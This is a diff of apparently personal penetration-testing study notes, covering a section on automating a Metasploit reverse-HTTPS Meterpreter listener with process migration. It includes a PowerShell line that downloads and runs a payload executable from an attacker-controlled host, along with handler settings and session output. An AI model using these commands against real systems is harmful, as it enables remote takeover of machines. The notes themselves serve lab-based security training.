@@ -2064,31 +2064,31 @@ Reference
     `kali@kali:~$ sudo xfreerdp /v:127.0.0.1 /u:luiza`  
 
 **Automating metasploit**  
-- activate module
+- activate module  
   ```
   use exploit/multi/handler
   set PAYLOAD windows/meterpreter_reverse_https
   set LHOST 192.168.119.4
   set LPORT 443
   ```
-- Set AutoRunScript to the migrate module
+- Set AutoRunScript to the migrate module  
   `set AutoRunScript post/windows/manage/migrate`
-- Set ExitOnSession to false to keep the multi/handler listening after a connection
+- Set ExitOnSession to false to keep the multi/handler listening after a connection  
   `set ExitOnSession false`
-- run it as a job in the background and to stop us from automatically interacting with the session
+- run it as a job in the background and to stop us from automatically interacting with the session  
   `run -z -j`
-- Executing the resource script
+- Executing the resource script  
   `kali@kali:~$ sudo msfconsole -r listener.rc`
-- Executing the Windows executable containing the Meterpreter payload
+- Executing the Windows executable containing the Meterpreter payload  
   `PS C:\Users\justin> iwr -uri http://192.168.119.4/met.exe -Outfile met.exe`  
   `PS C:\Users\justin> .\met.exe`  
-- Incoming connection and successful migration to a newly spawned Notepad process
+- Incoming connection and successful migration to a newly spawned Notepad process  
   ```
   [*] Spawning notepad.exe process to migrate into
   [*] Migrating into 5340
   [+] Successfully migrated into process 5340
   ```
-- Listing all resource scripts provided by Metasploit
+- Listing all resource scripts provided by Metasploit  
   `kali@kali:~$ ls -l /usr/share/metasploit-framework/scripts/resource`
 - ddd
 ### 22. Active directory introduction and enumeration
